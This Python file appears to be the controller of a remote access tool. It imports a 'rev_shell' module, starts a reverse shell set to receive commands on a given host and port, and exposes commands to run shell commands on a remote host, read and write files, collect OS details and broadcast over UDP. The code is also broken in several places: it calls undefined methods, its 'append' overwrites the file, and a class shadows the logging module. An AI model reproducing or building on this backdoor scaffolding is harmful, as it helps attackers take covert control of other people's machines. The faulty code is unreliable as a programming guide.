import os
import socket
import threading
import time
import logging
import sys
import subprocess
import argparse

import rev_shell


class Tools:

    def __init__(self, port):
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        # Set up logging
        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)


    def read_file(self, file_path):
        """Read the contents of a file."""
        try:
            with open(file_path, 'r') as file:
                content = file.read()
                self.logger.info(f"Read from {file_path}: {content}")
                return content
        except Exception as e:
            self.logger.error(f"Error reading file {file_path}: {e}")

    def write_file(self, file_path, content):
        """Write content to a file."""
        try:
            with open(file_path, 'w') as file:
                file.write(content)
                self.logger.info(f"Wrote to {file_path}: {content}")
        except Exception as e:
            self.logger.error(f"Error writing to file {file_path}: {e}")

    def append_file(self, file_path, content):
        """Write content to a file."""
        try:
            with open(file_path, 'w') as file:
                file.write(content)
                self.logger.info(f"Appended to {file_path}: {content}")
        except Exception as e:
            self.logger.error(f"Error appending to file {file_path}: {e}")

    def collect_os_data(self):
        """Collect basic OS data."""
        os_data = {
            'os_name': os.name,
            'platform': os.uname().sysname,
            'release': os.uname().release,
            'version': os.uname().version,
            'machine': os.uname().machine,
            'processor': os.uname().processor,
        }
        self.logger.info(f"OS Data Collected: {os_data}")
        return os_data

    def start(self):
        """Start broadcasting and receiving in separate threads."""
        broadcast_thread = threading.Thread(target=self.broadcast_data)
        receive_thread = threading.Thread(target=self.receive_broadcast)

        broadcast_thread.start()
        receive_thread.start()

        # Optionally, join the threads if you want to wait for them to finish
        broadcast_thread.join()
        receive_thread.join()

class logging():
    def __init__(self, level=logging.DEBUG):
        self.level = level
        logging.basicConfig(level=self.level, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)

    def log(self, message):
        self.logger.debug(message)

    def log_error(self, message):
        self.logger.error(message)

    def log_info(self, message):
        self.logger.info(message)




if __name__ == "__main__":

    # Initialize tools and rev_shell instances
    tools_instance = Tools(port=12345) # + port for broadcasting
    rev_shell_instance = rev_shell(host='127.0.0.1', port=54321) # + ip & port for receiving commands

    # Start tools and rev_shell in separate threads
    tools_thread = threading.Thread(target=tools_instance.start)
    rev_shell_thread = threading.Thread(target=rev_shell_instance.recieve_cmd_udp)

    tools_thread.start()
    rev_shell_thread.start()

    # Set up argument parser
    parser = argparse.ArgumentParser(description="Execute specific functionality based on arguments.")
    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    # Subparser for broadcasting
    broadcast_parser = subparsers.add_parser('broadcast', help="Start broadcasting and receiving.")

    # Subparser for executing a command
    execute_parser = subparsers.add_parser('execute', help="Execute a command on the remote host.")
    execute_parser.add_argument('cmd', type=str, help="Command to execute.")

    # Subparser for reading a file
    read_parser = subparsers.add_parser('read', help="Read the contents of a file.")
    read_parser.add_argument('file', type=str, help="Path to the file to read.")

    # Subparser for writing to a file
    write_parser = subparsers.add_parser('write', help="Write content to a file.")
    write_parser.add_argument('file', type=str, help="Path to the file to write to.")
    write_parser.add_argument('content', type=str, help="Content to write to the file.")

    # Subparser for collecting OS data
    osdata_parser = subparsers.add_parser('osdata', help="Collect and display OS data.")

    args = parser.parse_args()

    # Handle commands
    if args.command == 'broadcast':
        tools_instance.start()
    elif args.command == 'execute':
        rev_shell_instance.execute_cmd(args.cmd)
    elif args.command == 'read':
        tools_instance.read_file(args.file)
    elif args.command == 'write':
        tools_instance.write_file(args.file, args.content)
    elif args.command == 'osdata':
        os_data = tools_instance.collect_os_data()
        print(os_data)
    else:
        parser.print_help()